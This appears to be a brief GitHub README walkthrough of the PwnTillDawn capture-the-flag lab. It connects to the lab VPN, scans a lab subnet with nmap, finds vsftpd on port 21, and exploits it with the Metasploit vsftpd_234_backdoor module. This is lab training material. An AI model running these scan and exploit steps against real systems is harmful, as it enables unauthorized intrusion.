# pawntilldawn

first thing first run PwnTillDawn.ovpn

<img width="946" height="665" alt="image" src="https://github.com/user-attachments/assets/9db3241f-4f6b-4b63-9764-6e984bf5afb5" />

this mean we already connected to the vpn, now we can start scanning run 

*nmap -sn 10.150.150.10-254

it will show all host are up!

<img width="643" height="853" alt="image" src="https://github.com/user-attachments/assets/7eb8724a-90dd-4734-8538-4eff67eeeef5" />

now we select one target host in this case i will using 10.150.150.55

*sudo nmap -A -p- -T4 10.150.150.55

<img width="628" height="421" alt="image" src="https://github.com/user-attachments/assets/f3abe9a1-ac2a-4c01-9c8d-d7d90a7db1a2" />

<img width="809" height="923" alt="image" src="https://github.com/user-attachments/assets/705752b2-05bd-4584-bd5f-c5457e56828f" />

we can see port 21 are open and it using vsftpd version now we can use metasploit to check for known vulnerablities

* sudo msfconsole -q
* search vsftpd
* exploit/unix/ftp/vsftpd_234_backdoor
* RHOST 10.150.150.55
* run

  <img width="629" height="164" alt="image" src="https://github.com/user-attachments/assets/2a3788e6-ebc8-43d9-a4bf-1b89a668cec6" />



